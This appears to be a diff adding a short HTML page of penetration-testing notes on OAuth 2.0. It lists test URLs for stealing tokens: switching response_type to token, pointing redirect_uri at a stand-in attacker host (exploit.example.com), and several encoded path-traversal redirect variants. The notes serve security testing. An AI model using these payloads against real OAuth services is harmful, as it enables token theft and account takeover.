@@ -1,0 +1,31 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>OAuth2.0</title>
+</head><body><img src="image.png"/><b><br/>
+</b><b><br/>
+More info in book Mastering Modern Web Penetration Testing<br/>
+<br/>
+Test stealing tokens<br/>
+</b><br/>
+Test in step 2 if <tt>type</tt>parameter can be tampered with <tt>token</tt>value<br/>
+<tt><br/>
+https://www.facebook.com/v2.0/dialog/oauth?client_id=123 &amp;redirect_uri=https%3A%2F%2Fwww.example.com%2Foauth%2Fcallback<br/>
+</tt><tt>&amp;response_type=<b>token</b>&amp;scope=email&amp;state=XYZ</tt><b><br/>
+</b><b><br/>
+</b><b>Testing Open Redirect</b><br/>
+<tt><br/>
+https://api.trusted.com/oauth2/authorization?response_<br/>
+type=code&amp;client_id=75e7i92lbwy4p4&amp;scope=blahblahblah&amp;redirect_<br/>
+</tt><tt>uri=http://exploit.example.com/</tt><br/>
+<br/>
+<tt>https://api.trusted.com/oauth2/authorization?response_<br/>
+type=code&amp;client_id=idontexistbro&amp;scope=read&amp;redirect_uri=http://<br/>
+</tt><tt>exploit.example.com/</tt><br/>
+<br/>
+<tt>http://example.com/token/callback/../../our/path<br/>
+http://example.com/token/callback/.%0a./.%0d./our/path<br/>
+http://example.com/token/callback/%252e%252e/%252e%252e/our/path<br/>
+/our/path///../../http://example.com/token/callback/<br/>
+</tt><tt>http://example.com/token/callback/%2e%2e/%2e%2e/our/path</tt><br/>
+</body></html>
